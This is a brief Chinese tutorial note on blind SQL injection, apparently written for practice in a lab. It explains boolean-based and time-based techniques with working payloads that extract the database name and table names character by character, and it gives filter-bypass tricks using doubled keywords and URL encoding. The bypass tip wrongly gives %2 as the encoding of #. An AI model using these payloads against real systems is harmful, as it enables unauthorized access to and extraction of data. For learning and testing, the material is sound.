# 盲注

## 一、原理

当程序设计时，屏蔽了报错信息，造成无法判断sql注入结果的一种注入手段。分为两种

一种为真假盲注，boolean;另一种为时间盲注，time

## 二、实践

#### 基于真假的盲注

基于真假的盲注只会返回true or fause两种情况，判断很麻烦，需要使用程序.这玩意好像只能用and

##### 0.判断

输入参数看返回情况

##### 1.判断字符长度

```
kobe' and length(database())>8#
```

使用lenth函数得到database的长度，然后比较长度

#### 2.判断字符

```
kobe' and ascii(substr(payload,1,1))>119#
```

```
kobe' and ascii(substr(database(),1,1))>119#
```

查询表名

```
kobe' and ascii(substr((select 1,table_name from information_schema.tables where table_schema= database() limit 0,1),1,1))>111#
```

substr函数从database（）从第一个字符开始，取第一个值，然后经过ascii编码比较大小判断字符

#### 基于时间的盲注

基于时间的盲注，额，前端没啥响应，是否存在时间注入，主要看响应的时间。可以使用网络控制台

一般基于时间的注入，可以调用sleep()函数

测试是否存在时间注入

```
kobe' and sleep(2)#
```

构成载荷 

```
kobe' and if((substr(payload,1,1))='a',sleep(5),null)#
```

下面这一段可以作为payload，也可以使用ascii码进行比较判断字符。

```
(substr(payload,1,1))='a'
```

判断数据库名

```
kobe' and if((substr(database(),1,1))='a',sleep(5),null)#
```

## 三、注意

用工具，需耐心<u></u>

<u>***一般程序会对一些函数进行过滤，如select 可以使用复写的方式绕过，如selselectect 进行绕过。***</u>

***<u>对一些字符可能也会存在过滤，可以使用url编码的方式进行绕过，如#可以用%2代替</u>***


